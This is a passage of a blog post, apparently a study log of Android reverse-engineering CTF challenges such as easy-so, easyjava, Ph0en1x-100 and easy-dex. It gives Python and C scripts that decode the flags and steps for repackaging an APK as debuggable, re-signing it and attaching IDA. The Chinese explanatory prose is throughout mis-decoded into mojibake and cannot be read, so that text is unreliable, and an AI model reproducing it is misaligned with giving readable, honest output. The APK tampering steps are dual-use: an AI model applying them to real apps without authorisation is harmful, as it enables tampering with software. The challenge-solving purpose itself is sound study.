class="string">'q'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>, <span class="string">'G'</span>, <span class="string">'H'</span>, <span class="string">'I'</span>, <span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'e'</span>,</span><br><span class="line">        <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">enc = <span class="string">'5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">ans = <span class="string">''</span>.join([<span class="string">'&#123;:0&gt;6&#125;'</span>.format(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)//<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(ans[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)], <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#05397c42f9b6da593a3644162d36eb01</span></span><br></pre></td></tr></table></figure><h3 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h3><p>ç®€å•è€ƒäº†javaä¸­å¯¹åŠ¨æ€é“¾æ¥åº“çš„è°ƒç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = list(<span class="string">'f72c5a36569418a20907b55be5bf95ad'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">flag = s[len(s)//<span class="number">2</span>:len(s)] + s[<span class="number">0</span>:len(s)//<span class="number">2</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#90705bb55efb59da7fc2a5636549812a</span></span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>å°±æ˜¯è¯»ç¹ççš„javaä»£ç ï¼Œç†è§£ç¨‹åºåŠ å¯†æµç¨‹ã€‚</p><p>è€ƒç‚¹ï¼šjavaä»£ç çš„é˜…è¯»èƒ½åŠ›ï¼›ç®€å•çš„ç½®æ¢åŠ å¯†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'wigwrkaugala'</span></span><br><span class="line">base = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">a = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    ans += [a[base.index(i)]]</span><br><span class="line">print(ans)</span><br><span class="line">b = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>]</span><br><span class="line">base = list(base)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    flag += base[b[i]]</span><br><span class="line">    b = b[<span class="number">1</span>:len(b)] + [b[<span class="number">0</span>]]</span><br><span class="line">    base = base[<span class="number">1</span>:len(base)] + [base[<span class="number">0</span>]]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#venividivkcr</span></span><br></pre></td></tr></table></figure><h3 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h3><p>è¾“å…¥å­—ç¬¦å’Œå’Œsoå±‚å‡½æ•°è·å¾—çš„å­—ç¬¦ä¸²ç»è¿‡md5åŠ å¯†åè¿›è¡Œæ¯”è¾ƒã€‚</p><p>ä»è¿™ä¸ªé¢˜ç»ƒä¹ äº†ä¸‹è°ƒè¯•soã€‚æ³¨æ„ï¼šå®‰å“æ¨¡æ‹Ÿå™¨ä¸èƒ½è°ƒè¯•armæ¶æ„çš„soæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ€å¥½ç”¨çœŸæœºæ¥è°ƒè¯•nativeå±‚ã€‚</p><p>é¦–å…ˆæ˜¯ç›´æ¥æ¨¡æ‹Ÿç¨‹åºè·‘flagï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">46</span>,  <span class="number">54</span>,  <span class="number">66</span>,  <span class="number">76</span>,  <span class="number">95</span>, <span class="number">191</span>, <span class="number">224</span>,  <span class="number">58</span>, <span class="number">168</span>, <span class="number">195</span>, </span><br><span class="line">   <span class="number">32</span>,  <span class="number">99</span>, <span class="number">137</span>, <span class="number">183</span>, <span class="number">192</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">68</span>, <span class="number">194</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">127</span>, <span class="number">237</span>,   <span class="number">2</span>,  <span class="number">14</span>,  <span class="number">93</span>, <span class="number">102</span>, <span class="number">143</span>, <span class="number">152</span>, <span class="number">181</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">208</span>,  <span class="number">22</span>,  <span class="number">77</span>, <span class="number">131</span>, <span class="number">248</span>, <span class="number">251</span>,   <span class="number">1</span>,  <span class="number">67</span>,  <span class="number">71</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"Hello Ph0en1x"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="built_in">strlen</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ( i = <span class="keyword">sizeof</span>(a) - <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> v3 = a[i] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *v7 = &amp;a[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v4 = i % v6;</span><br><span class="line">a[i] = (b[v4] ^ (v3 - *v7)) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>] = (a[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(a[i]+<span class="number">1</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è°ƒè¯•äº†ã€‚ç®€å•è®°ä¸€ä¸‹æµç¨‹ï¼š</p><p>å‡†å¤‡å·¥ä½œï¼š</p><p>1.è§£åŒ…ç¨‹åºï¼Œ<strong>apktool.bat d a.apk</strong>ã€‚åœ¨AndroidManifest.xmlä¸­çš„<strong>application</strong>åé¢åŠ ä¸Šandroid:debuggable=â€trueâ€ã€‚</p><p>2.é‡æ–°æ‰“åŒ…ç¨‹åºï¼Œ<strong>apktool.bat b a</strong>ï¼Œè¿™æ—¶å€™åœ¨aæ–‡ä»¶å¤¹ä¸­çš„distä¸‹çš„å°±æ˜¯ç›®æ ‡é‡æ–°æ‰“åŒ…åçš„ç¨‹åºã€‚</p><p>3.å¯¹é‡æ‰“åŒ…åçš„apkè¿›è¡Œç­¾åã€‚</p><ul><li>ç”Ÿæˆç­¾åæ–‡ä»¶ï¼škeytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</li><li>è¿›è¡Œç­¾åï¼šjarsigner -verbose -keystore abc.keystore -signedjar b.apk a.apk abc.keystore</li></ul><p>æ¥ä¸‹æ¥æŠŠç¨‹åºè£…å…¥æ¨¡æ‹Ÿå™¨ï¼Œè¿è¡Œï¼Œè¿›è¡Œè°ƒè¯•ï¼Œæ“ä½œå’Œå¸¸è§„çš„è°ƒè¯•elfæ–‡ä»¶å·®ä¸å¤šäº†ã€‚</p><p>ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨ç¨‹åºï¼š<strong>adb shell am start -D -n åŒ…å/.æ´»åŠ¨å</strong></p><p>ç«¯å£è½¬å‘ï¼š<strong>adb forward tcp:23946 tcp:23946</strong></p><p>å› ä¸ºæˆ‘ç”¨çš„æ¨¡æ‹Ÿå™¨ï¼Œè¿™é‡Œç”¨äº†x86æ¶æ„çš„soæ–‡ä»¶æ‰è°ƒè¯•ä¸Šï¼Œè™½ç„¶æœ‰ç‚¹ä¸èƒ½ç†è§£ï¼Œä¸ºä»€ä¹ˆæ¨¡æ‹Ÿå™¨é‡Œç¨‹åºéƒ½èƒ½è¿è¡Œï¼Œè¯´æ˜å¯¹soæ–‡ä»¶æ˜¯è¿è¡Œäº†çš„å•Šï¼Œé‚£è°ƒè¯•æ€ä¹ˆå°±ä¸è¡Œå‘¢ï¼ˆ<strong>åœ¨ä¹‹åçªç„¶æƒ³åˆ°çš„æƒ³æ³•è¡¥å……ï¼šå¯èƒ½æ˜¯é¢˜ç›®æœ‰å¯¹åº”ç»“æ„çš„soæ–‡ä»¶ï¼Œåªæ˜¯æ²¡æä¾›ç»™æˆ‘ä»¬</strong>ï¼‰ï¼Œä¸”android_serveråœ¨æ¨¡æ‹Ÿå™¨é‡Œä¹Ÿå¯ä»¥è¿è¡Œçš„ã€‚ã€‚å…¶å®è¿™é‡Œçš„æç¤ºå¯ä»¥çœ‹è§å®ƒè°ƒç”¨çš„æ˜¯<strong>1/lib/x86/ä¸‹çš„so</strong>ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206212259169.png" alt="image-20210206212259169"></p><p>å—¯ï¼Œï¼Œåˆå­¦ä¸€ä¸ªä¸œè¥¿å¼€å§‹æ€»æ˜¯æœ‰å¾ˆå¤šç–‘æƒ‘çš„ï¼Œç­‰æ¥è§¦å¤šäº†æ¥æ…¢æ…¢ç†è§£ã€‚</p><p>idaä¸­æˆåŠŸé™„åŠ ä¸Šç¨‹åºåï¼Œåœ¨Modulesæ¨¡å—æ‰¾åˆ°æˆ‘ä»¬è¦è°ƒè¯•çš„soæ–‡ä»¶ï¼Œå†ç»§ç»­æ‰¾åˆ°æˆ‘ä»¬è¦è°ƒè¯•çš„å‡½æ•°ã€‚</p><p>å¾—åˆ°ç»“æœï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206210632330.png" alt="image-20210206210632330"></p><h3 id="é»‘å®¢ç²¾ç¥"><a href="#é»‘å®¢ç²¾ç¥" class="headerlink" title="é»‘å®¢ç²¾ç¥"></a>é»‘å®¢ç²¾ç¥</h3><p>å‡ºç°æ–°çŸ¥è¯†ç‚¹ï¼šsoæ–‡ä»¶ä¸­çš„å‡½æ•°ä¸ºåŠ¨æ€æ³¨å†Œã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182454660.png" alt="image-20210207182454660"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182859376.png" alt="image-20210207182859376"></p><p>ç„¶åå°±æ˜¯ä¸€ä¸ªåŠ ä¸Šæ–‡ä»¶è¯»å†™æ“ä½œçš„å¼‚æˆ–åŠ å¯†ã€‚</p><p>2ä¸ªæ¶‰åŠçš„å‡½æ•°åŠŸèƒ½ï¼šé€šå¸¸è¿ç”¨æ¥è®¡ç®—å‡ºä¸€ä¸ªæ–‡ä»¶ä¸­æ•°æ®çš„å­—èŠ‚æ•°ã€‚</p><ul><li>C åº“å‡½æ•° <strong>int fseek(FILE *stream, long int offset, int whence)</strong> è®¾ç½®æµ <strong>stream</strong> çš„æ–‡ä»¶ä½ç½®ä¸ºç»™å®šçš„åç§» <strong>offset</strong>ï¼Œå‚æ•° offset æ„å‘³ç€ä»ç»™å®šçš„ <strong>whence</strong> ä½ç½®æŸ¥æ‰¾çš„å­—èŠ‚æ•°ã€‚</li><li>C åº“å‡½æ•° <strong>long int ftell(FILE *stream)</strong> è¿”å›ç»™å®šæµ stream çš„å½“å‰æ–‡ä»¶ä½ç½®ã€‚</li></ul><p>æ¥ä¸‹æ¥è§£é¢˜éƒ¨åˆ†ï¼šç›´æ¥è¾“å…¥å¯†æ–‡å€¼ï¼Œåœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¼‚æˆ–åçš„å€¼å³æ˜¯flagã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207184727271.png" alt="image-20210207184727271"></p><h3 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h3><p>é¢˜ç›®å¾—åˆ°flagçš„éš¾åº¦ä¸å¤§ï¼Œä½†æ¶‰åŠçš„çŸ¥è¯†è¿˜éœ€è¦å¤šå­¦ä¹ ã€‚</p><p>jadxä¸­å‘ç°æ²¡æœ‰dexæ–‡ä»¶ï¼Œä»AndroidMainfest.xmlçœ‹åˆ°ï¼šNativeActivityï¼Œå®‰å“è¿›è¡Œndkå¼€å‘ä½¿ç”¨çš„ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯è½¬æˆ˜soæ–‡ä»¶ä¸­äº†ã€‚<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/ncjKwbuX1qBF6ke.png" alt="image-20210208171101099"></p><p>æ‰¾åˆ°android_mainå‡½æ•°ï¼Œé¦–å…ˆæ˜¯è¿›è¡Œè§£å¯†äº†2ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºæ¥å°±æ˜¯appåŒ…è·¯å¾„ç›¸å…³çš„ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208171841729.png" alt="image-20210208171841729"></p><p>ç„¶åä»æ‰“å°çš„logï¼Œå¯ä»¥å¸®åŠ©è¯†åˆ«ç¨‹åºçš„åŠŸèƒ½å’Œæµç¨‹ã€‚å°±æ˜¯åœ¨10så†…æ‘‡åŠ¨æ‰‹æœº100æ¬¡ï¼Œç„¶åä¼šä½¿ç”¨è¿™ä¹‹é—´çš„è¡¨ç¤ºæ¬¡æ•°çš„æ•°æ®æ¥è§£å¯†ä¸€äº›æ•°æ®ä»£ç ï¼šå°±æ˜¯æŠŠencåˆ†ä¸º10ç»„ï¼Œç„¶åå‰8ç»„åˆ†åˆ«å’Œ9, 19, 29â€¦å¼‚æˆ–è§£å¯†ï¼Œå2ç»„å’Œ89å¼‚æˆ–è§£å¯†ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172040397.png" alt="image-20210208172040397"></p><p>ç„¶åè§£å‹ç¼©æ•°æ®ï¼Œå†™å…¥æ–‡ä»¶ã€‚ä»ä¸Šé¢æ‰“å°å‡ºçš„è·¯å¾„ä¿¡æ¯ï¼Œå¯ä»¥çŒœæµ‹è¿™ä¸ªå°±æ˜¯ç”Ÿæˆä¸€ä¸ªdexæ–‡ä»¶ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172227628.png" alt="image-20210208172227628"></p><p>ä»¿ç…§ç¨‹åºé€»è¾‘ä½¿ç”¨idapythonè§£å¯†æ•°æ®åå†™å…¥æ–‡ä»¶ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line">addr = <span class="number">0x07004</span></span><br><span class="line">length = <span class="number">0x3CA10</span></span><br><span class="line">n = length//<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    a = get_byte(addr+i)</span><br><span class="line">    b = i//n</span><br><span class="line">    b = <span class="number">8</span> <span class="keyword">if</span> b &gt; <span class="number">8</span> <span class="keyword">else</span> b </span><br><span class="line">    c = b*<span class="number">10</span>+<span class="number">9</span></span><br><span class="line">    data += [a^c]</span><br><span class="line">data = bytes(data)</span><br><span class="line">f = open(<span class="string">'ans.Z'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line">print(<span class="string">"-------success-----------"</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯èŠ±äº†ç‚¹æ—¶é—´çš„çš„uncompressæ“ä½œï¼Œè¯•äº†è¯•linuxä¸‹çš„å‘ç°ä¸è¡Œã€‚ç„¶åæœç´¢æ–‡ä»¶å¤´ï¼š<strong>78 9c</strong>ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨<a href="http://aluigi.org/mytoolz/offzip.zip" target="_blank" rel="noopener">Aluigiâ€™s offzip</a> ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172543745.png" alt="image-20210208172543745"></p><p>æå–å‡ºæ–‡ä»¶å…¶ä¸­çš„æ•°æ®ï¼Œå¾—åˆ°ä¸€ä¸ªdexæ–‡ä»¶ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175926442.png" alt="image-20210208175926442"></p><p>åˆ†ædexæ–‡ä»¶ã€‚å‘ç°æœ‰å¾ˆå¤šidï¼Œåœ¨res\values\public.xmlä¸­æ‰¾åˆ°å¯¹åº”idçš„nameï¼Œç„¶åå†åˆ°stringsä¸­æ‰¾åˆ°å¯¹åº”nameçš„å­—ç¬¦ä¸²ã€‚å¯¹å…¶æ³¨é‡Šäº†ä¸€ä¸‹ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172846985.png" alt="image-20210208172846985"></p><p>çœ‹äº†ä¸€åœˆåï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬è¾“å…¥çš„ç»è¿‡ä¸€ç§åŠ å¯†ç®—æ³•åä¸å¯†æ–‡æ¯”è¾ƒï¼Œè€Œ<strong>I have a male fish and a female fish.</strong>æ˜¯keyï¼Œçœ‹åˆ°åªæ˜¯å–äº†å®ƒçš„32ä½ï¼Œç„¶åæ˜¯keyåˆ¤æ–­ã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173320567.png" alt="image-20210208173320567"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173332255.png" alt="image-20210208173332255"></p><p>å¼€å§‹ä»å­—ç¬¦ä¸²fishä»¥ä¸ºæ˜¯blowfishåŠ å¯†ï¼Œä½†ç®€å•çœ‹äº†ä¸‹æµç¨‹ï¼Œå®Œå…¨å¯¹ä¸ä¸Šã€‚</p><blockquote><p><strong>blowfishæ˜¯åŠ å¯†64bitä¸ºæ•°æ®ï¼Œå¯†é’¥ä¹Ÿæ˜¯64bitä½ã€‚æŠŠå¯†æ–‡åˆ†ä¸ºæ¯8ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œç„¶åä¸€ç»„åˆ†æˆ2ä¸ªéƒ¨åˆ†ï¼Œè¿›è¡Œè½®å‡½æ•°åŠ å¯†ã€‚</strong></p></blockquote><p>ä½†è¿™é‡Œæ˜¯æ¯16ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œä¸”åŠ å¯†æµç¨‹ä¹Ÿä¸ä¸€æ ·ï¼š</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175231246.png" alt="image-20210208175231246"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175306552.png" alt="image-20210208175306552"></p><p>æœ€åï¼Œç¿»äº†ä¸€ä¸‹è¿™ä¸ªåŠ å¯†ä¸­çš„æ•°æ®ç”¨æ¥æœç´¢ä¸‹æ‰¾æ‰¾ç›¸å…³çš„åŠ å¯†ç®—æ³•ã€‚</p><p>ä»æœ€é¡¶éƒ¨çš„æ•°æ®ï¼Œgoogleç»“æœï¼š<a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">TwoFish</a></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175435115.png" alt="image-20210208175435115"></p><p>ç„¶åä½¿ç”¨pythonè§£å¯†ä¸€ä¸‹ï¼šå› ä¸º33ä½ï¼Œä¸æ˜¯16çš„å€æ•°ï¼Œç”¨0è¡¥é½æˆäº†48ä½ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twofish <span class="keyword">import</span> Twofish</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">-120</span>, <span class="number">77</span>, <span class="number">-14</span>, <span class="number">-38</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">-42</span>, <span class="number">44</span>, <span class="number">0xE0</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">0x1F</span>, <span class="number">24</span>, <span class="number">-91</span>, <span class="number">0x90</span>, <span class="number">-83</span>, <span class="number">0x40</span>, <span class="number">-83</span>, <span class="number">0x80</span>, <span class="number">84</span>, <span class="number">5</span>, <span class="number">-94</span>, <span class="number">-98</span>, <span class="number">-30</span>, <span class="number">18</span>, <span class="number">70</span>, <span class="number">-26</span>, <span class="number">71</span>, <span class="number">5</span>, <span class="number">-99</span>, <span class="number">-62</span>, <span class="number">-58</span>, <span class="number">0x75</span>, <span class="number">29</span>, <span class="number">-44</span>, <span class="number">6</span>, <span class="number">0x70</span>, <span class="number">-4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">-51</span>, <span class="number">0x5F</span>, <span class="number">-34</span>, <span class="number">12</span>, <span class="number">0x2F</span>, <span class="number">77</span>]</span><br><span class="line">enc = [i&amp;<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'I have a male fish and a female '</span>.encode() <span class="comment">#bytesç±»å‹</span></span><br><span class="line"></span><br><span class="line">T = Twofish(key)</span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)//<span class="number">16</span>):</span><br><span class="line">    flag += T.decrypt(enc[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯åšå®Œé¢˜çœ‹äº†åˆ«äººwpå­¦ä¹ ï¼Œå‘ç°ï¼š</p><ul><li>é‚£ä¸ªuncompressæ“ä½œå…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨pythonçš„zlibæ¨¡å—ï¼Œ<strong>zlib.decompress(data)</strong> å°±å¯ä»¥äº†ã€‚</li><li>å¯ä»¥æŠŠdexåˆæˆæ–°çš„apkæ–‡ä»¶è¿è¡Œï¼Œæ¥ä¸‹æ¥æ“ä½œä¸€ä¸‹ã€‚</li></ul><p>dexåˆæˆæ–°çš„apkæ–‡ä»¶ï¼š</p><p>1.æŠŠä¹‹å‰çš„appè§£åŒ…ã€‚</p><p>2.æŠŠ<strong>AndroidManifest.xml</strong>ä¸­çš„android:hasCode=â€falseâ€å±æ€§å»æ‰ï¼Œé»˜è®¤ä¸ºTrueã€‚åŸå› ï¼šä¹‹å‰çš„appæ˜¯ç”¨c++å¼€å‘çš„ï¼Œappä¸­å¹¶ä¸åŒ…å«javaä»£ç ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªå±æ€§è®¾ç½®ä¸ºFalseã€‚</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208185306706.png" 